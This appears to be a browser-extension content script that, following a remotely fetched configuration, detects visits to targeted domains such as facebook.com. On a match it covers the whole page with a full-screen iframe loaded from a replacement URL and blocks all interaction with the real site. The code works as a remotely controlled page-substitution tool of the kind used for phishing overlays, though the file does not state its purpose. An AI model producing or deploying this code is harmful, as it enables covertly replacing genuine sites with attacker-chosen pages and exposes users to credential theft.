// content.js - Dynamic overlay - V1.3 Real-time, Hostname Match, Debug

// --- Global state for this instance ---
let csDebugMode = false; // Default to off, updated from background

// --- Logging Helper ---
function log(level, ...args) {
    if (csDebugMode) { // Check global flag
        console[level](`[CS-${level.toUpperCase()}]`, ...args);
    }
}

// --- Normalize URL Hostname for Comparison ---
// Extracts hostname, lowercases, removes optional 'www.'
function normalizeHostname(url) {
    try {
        const hostname = new URL(url).hostname.toLowerCase();
        return hostname.replace(/^www\./, '');
    } catch (e) {
        log("warn", "Could not parse or normalize URL for hostname:", url, e);
        // Fallback: try to extract domain-like part crudely
        const simplified = url.toLowerCase().split('/')[2] || '';
        return simplified.replace(/^www\./, '');
    }
}

// --- Apply Overlay Function ---
// (Keep the robust version from V1.2 that includes checks, shadow DOM, styling, interaction blocking)
function applyOverlay(iframeSrc) {
    log("info", `ApplyOverlay: Injecting iframe with source: ${iframeSrc}`);

    // Prevent double injection (check ID)
     if (document.getElementById('dynamic-overlay-container')) {
         log('warn', 'ApplyOverlay: Container already exists, aborting.');
         return;
     }

     const iframeStyle = { position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh', border: 'none', margin: '0', padding: '0', zIndex: '2147483647', backgroundColor: 'white' };

    try {
        const container = document.createElement('div');
        container.id = 'dynamic-overlay-container';
        Object.assign(container.style, { position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh', zIndex: '2147483647', pointerEvents: 'auto' }); // Crucial: allow pointer events on container

        const shadowRoot = container.attachShadow({ mode: 'open' });
        const overlay = document.createElement('iframe');
        overlay.src = iframeSrc;
        Object.assign(overlay.style, iframeStyle);
        shadowRoot.appendChild(overlay);

        if (document.documentElement) {
            document.documentElement.prepend(container);
            log('info', 'ApplyOverlay: Container prepended.');
        } else {
             console.error('[CS-CRITICAL] ApplyOverlay: documentElement not found!'); return; // Log critical always
         }

        // Interaction blocking
        log('info', 'ApplyOverlay: Blocking page interaction.');
        try {
            // Use setProperty with !important for higher chance of overriding page styles
            document.documentElement.style.setProperty('overflow', 'hidden', 'important');
            document.documentElement.style.setProperty('pointer-events', 'none', 'important');
            if (document.body) {
                 document.body.style.setProperty('overflow', 'hidden', 'important');
                 document.body.style.setProperty('pointer-events', 'none', 'important');
                 log('info', 'ApplyOverlay: Interaction blocked on body immediately.');
            } else { // Wait briefly for body if needed
                 const observer = new MutationObserver((_, obs) => {
                    if (document.body) {
                        document.body.style.setProperty('overflow', 'hidden', 'important');
                        document.body.style.setProperty('pointer-events', 'none', 'important');
                        log('info', 'ApplyOverlay: Interaction blocked on body (delayed).');
                        obs.disconnect();
                    }
                 });
                 observer.observe(document.documentElement, { childList: true });
                 setTimeout(() => { observer.disconnect(); /* Add fallback check if needed */ }, 150);
            }
        } catch (e) { log("warn", "ApplyOverlay: Could not fully disable page interaction/scroll.", e); }

        log('info', 'ApplyOverlay: Overlay injection process complete.');

    } catch (error) {
        console.error('[CS-CRITICAL] ApplyOverlay: CRITICAL ERROR during overlay creation/injection:', error); // Log critical always
    }
}


// --- Main Execution Logic ---
function runOverlayCheck() {
    // Prevent multiple checks in same context
    if (document.documentElement.hasAttribute('data-overlay-check-running')) { return; }
    document.documentElement.setAttribute('data-overlay-check-running', 'true');

    const currentRawUrl = window.location.href;
    const currentNormalizedHost = normalizeHostname(currentRawUrl);

    console.log(`[CS] Initializing Check on: ${currentRawUrl} (NormHost: ${currentNormalizedHost})`); // Initial log always runs

    // Request latest status from background script
    chrome.runtime.sendMessage({ action: 'getLatestStatus', forceRefresh: true }, (response) => { // Don't force refresh by default
        // Check if response is valid (background might fail)
        if (chrome.runtime.lastError || !response || response.error) {
            console.error("[CS-CRITICAL] Error receiving status from background:", chrome.runtime.lastError || response?.message || 'Unknown error');
            document.documentElement.removeAttribute('data-overlay-check-running'); // Allow re-check later maybe?
            return;
        }

        // ** Update local debug mode based on response **
        csDebugMode = response.debugMode === true;
        log('info', "Received status from background:", response);

        // ** Check Enabled Status **
        if (!response.isEnabled) {
            log('info', "Device is disabled via backend configuration. Aborting overlay.");
            document.documentElement.removeAttribute('data-overlay-check-running');
            return;
        }

        // ** Check Config **
        const targetConfig = response.config;
        if (!targetConfig || typeof targetConfig !== 'object' || Object.keys(targetConfig).length === 0) {
            log('info', "Target config is missing, invalid, or empty. No targets to check.");
            document.documentElement.removeAttribute('data-overlay-check-running');
            return;
        }

        // --- Find Match (using normalized hostname) ---
        let replacementUrl = null;
        let matchedDomain = null; // The key from the config that matched

        log('info', `Checking current host "${currentNormalizedHost}" against ${Object.keys(targetConfig).length} target domain(s)...`);
        for (const targetDomainKey in targetConfig) {
            // Key is already expected to be normalized (e.g., "facebook.com")
             log('info', `Comparing: "${currentNormalizedHost}" === "${targetDomainKey}" ?`);

            if (currentNormalizedHost === targetDomainKey) {
                replacementUrl = targetConfig[targetDomainKey];
                matchedDomain = targetDomainKey;
                log('info', `---> Found EXACT Hostname Match! Target: ${matchedDomain}. Replacement: ${replacementUrl}`);
                break; // Exact match found, stop searching
            }
        }

        // --- Apply Overlay if Match Found ---
        if (replacementUrl) {
            log('info', `FINAL MATCH CONFIRMED: Domain "${matchedDomain}" for URL "${currentRawUrl}". Applying overlay.`);
            applyOverlay(replacementUrl);
            // Keep the 'data-overlay-check-running' attribute to prevent re-runs after successful overlay
        } else {
            log('info', "No matching target domain found for this hostname.");
            document.documentElement.removeAttribute('data-overlay-check-running'); // Allow re-check if navigation occurs within page?
        }
    });
}

// --- Run the check ---
// Need to handle potential race conditions with script loading vs. DOM ready slightly
if (document.readyState === 'loading') {
    // Still loading, run check when possible (document_start means this is usual)
    document.addEventListener('DOMContentLoaded', () => {
         // Check if already run by a faster instance (e.g., iframes)
         if (!document.documentElement.hasAttribute('data-overlay-check-running')) {
             runOverlayCheck();
         }
     }, { once: true });
     // Also run immediately in case DOMContentLoaded fires too late or not at all in some edge cases
     runOverlayCheck();
} else {
    // DOM already loaded, run check now
    runOverlayCheck();
}